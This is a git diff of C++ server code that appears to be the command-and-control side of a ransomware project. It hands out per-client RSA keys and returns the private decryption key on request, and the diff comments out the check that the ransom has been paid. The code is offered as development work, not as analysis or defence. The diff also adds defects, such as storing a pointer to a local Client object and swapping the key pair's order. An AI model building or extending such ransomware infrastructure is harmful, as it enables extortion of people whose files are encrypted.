@@ -43,7 +43,7 @@ RSAKeys ServerInterface::GenerateRSAPair() {
 	EVP_PKEY_CTX_free(ctx);
 	EVP_PKEY_free(key);
 
-	return std::make_pair(priv, pub);
+	return std::make_pair(pub, priv);
 }
 
 void ServerInterface::ListenForUDPMessages() {
@@ -67,7 +67,7 @@ void ServerInterface::ListenForUDPMessages() {
 
 BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
 	BOOL		  success = FALSE;
-	Client		  client  = GetClientData(cuid).first; // client who made the request
+	Client*		  client  = GetClientData(cuid).first; // client who made the request
 	ServerCommand responseCommand;
 
 	if ( !ClientIsInClientList(cuid) )
@@ -75,14 +75,14 @@ BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
 
 	switch ( req.action ) {
 	case ClientMessage::REQUEST_PRIVATE_ENCRYPTION_KEY:
-		if ( !IsRansomPaid(client) ) {
-			success = FALSE;
-			break;
-		}
+		//if ( !IsRansomPaid(client) ) {
+		//	success = FALSE;
+		//	break;
+		//}
 
 		responseCommand.action = RemoteAction::RETURN_PRIVATE_RSA_KEY;
 		//responseCommand.publicEncryptionKey = NetCommon::ConvertBIOToString(client.RSAPublicKey);
-		responseCommand.privateEncryptionKey = NetCommon::ConvertBIOToString(client.RSAPrivateKey);
+		responseCommand.privateEncryptionKey = NetCommon::ConvertBIOToString(client->RSAPrivateKey);
 		success = TCPSendMessageToClient(cuid, responseCommand);
 		std::cout << "sending\n";
 
@@ -107,18 +107,35 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 	{
 		// get a client response usually after an action is performed on the remote host
 		if ( client->ExpectingResponse ) {
+			std::cout << "expecting response\n";
 			client->LastClientResponse = client->RecentClientResponse;
-			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->TCPServerDetails.sfd, cuid);
+			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->TCPServerDetails.sfd, TRUE, client->RSAPrivateKey);
 			continue;
 		}
 		
 		// receive data from client, decrypt it using their rsa key
-		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(this->TCPServerDetails.sfd, cuid);
+		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->TCPSocket, TRUE, client->RSAPrivateKey);
 		receiving = receivedData.valid;
 
 		PerformTCPRequest(receivedData, cuid);
 	} 
 	while ( receiving );
+}
+
+BOOL ServerInterface::SendTCPClientRSAPublicKey(long cuid, BIO* pubKey) {
+	if ( !ClientIsInClientList(cuid) )
+		return FALSE;
+
+	Client* client = GetClientData(cuid).first;
+
+	std::string bio = NetCommon::ConvertBIOToString(pubKey); // pub key as a string
+	std::string base64 = macaron::Base64::Encode(bio);  
+	BYTESTRING buffer = NetCommon::SerializeString(base64);
+
+	BOOL sent = NetCommon::TransmitData(buffer, client->TCPSocket, TCP);
+	std::cout << "Sent RSA Pub Key (B64): " << base64 << std::endl;
+
+	return TRUE;
 }
 
 void ServerInterface::AcceptTCPConnections() {
@@ -138,35 +155,13 @@ void ServerInterface::AcceptTCPConnections() {
 		newClient.TCPSocket = clientSocket;
 		AddToClientList(newClient); // add them to the client list
 		
-		std::cout << "- Added the client to the client list\n";
+		SendTCPClientRSAPublicKey(newClient.ClientUID, newClient.RSAPublicKey);
+		std::cout << "Good connection. Send TCP Client key\n";
+		// start receiving tcp data from that client for the lifetime of that client
+		std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
+		receive.detach();
 
-		Sleep(1000);
-
-		std::cout << "sending key\n";
-		// send the rsa public key to the client on join
-		std::string bio = NetCommon::ConvertBIOToString(newClient.RSAPublicKey);
-		std::string b64 = macaron::Base64::Encode(bio);
-		std::cout << "base 64 key: " << b64 << std::endl;
-		ServerCommand cmd;
-		cmd.publicEncryptionKey = b64;
-		cmd.action = RETURN_PUBLIC_RSA_KEY;
-		cmd.valid = TRUE;
-
-		BYTESTRING b = NetCommon::SerializeString(b64);
-		long s = b.size();
-		send(newClient.TCPSocket, ( char* ) &s, sizeof(s), 0);
-		std::cout << "sent size (" << s << ")\n";
-		send(newClient.TCPSocket, ( char* ) b.data(), b.size(), 0);
-
-		//BOOL success = NetCommon::TCPSendMessage(cmd, clientSocket);
-		std::cout << "successfully sent key\n";
-		//TCPSendMessageToClient(newClient.ClientUID, key);
-
-		////// start receiving tcp data from that client for the lifetime of that client
-		//std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
-		//receive.detach();
-
-		// make it so we can send information to the client
+		// TODO: make it so we can send information to the client
 	}
 }
 
@@ -243,8 +238,13 @@ BOOL ServerInterface::StartServer(Server& server) {
 }
 
 BOOL ServerInterface::TCPSendMessageToClient(long cuid, ServerCommand& req) {
-	Client c = GetClientData(cuid).first;
-	return NetCommon::TCPSendMessage(req, c.TCPSocket);
+	Client* c = GetClientData(cuid).first;
+	return NetCommon::TCPSendMessage(req, c->TCPSocket);
+}
+
+
+BOOL ServerInterface::TCPSendMessageToClient(Client client, ServerCommand& req) {
+	return NetCommon::TCPSendMessage(req, client.TCPSocket);
 }
 
 ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
@@ -308,8 +308,8 @@ ClientResponse ServerInterface::PingClient(long cuid) {
 		return {};
 
 	ClientData clientInfo = GetClientData(cuid);
-	Client     client     = clientInfo.first;
-	if ( !client.SocketReady(TCP) ) // socket isnt ready so cant ping.
+	Client*    client     = clientInfo.first;
+	if ( !client->SocketReady(TCP) ) // socket isnt ready so cant ping.
 		return {};
 
 	// send the ping to the client over tcp
@@ -341,16 +341,14 @@ BOOL ServerInterface::AddToClientList(Client client) {
 	ClientListMutex.lock();
 	
 	RSAKeys    keys = std::make_pair(client.RSAPublicKey, client.RSAPrivateKey);
-	ClientData pair = std::make_pair(client, keys);
+	ClientData pair = std::make_pair(&client, keys);
 	std::pair<long, ClientData> clientListValue = std::make_pair(client.ClientUID, pair);
 	
 	this->ClientList.insert(clientListValue);
 	
 	ClientListMutex.unlock();
-
 	
-	// client has been correctly inserted as a tuple into clientlist
-	return this->ClientList.at(client.ClientUID).first.TCPSocket == client.TCPSocket;
+	return TRUE;
 }
 
 BOOL ServerInterface::IsClientAlive(long cuid) {
@@ -359,9 +357,9 @@ BOOL ServerInterface::IsClientAlive(long cuid) {
 		return FALSE; // Client doesn't exist. Nothing returned from GetClientData
 
 	ClientData clientInfo = GetClientData(cuid);
-	Client client = clientInfo.first;
+	Client* client = clientInfo.first;
 
-	if ( client.SocketReady(TCP) == FALSE )
+	if ( client->SocketReady(TCP) == FALSE )
 		return FALSE; // socket not setup 
 
 	// Check if client sends and receives ping
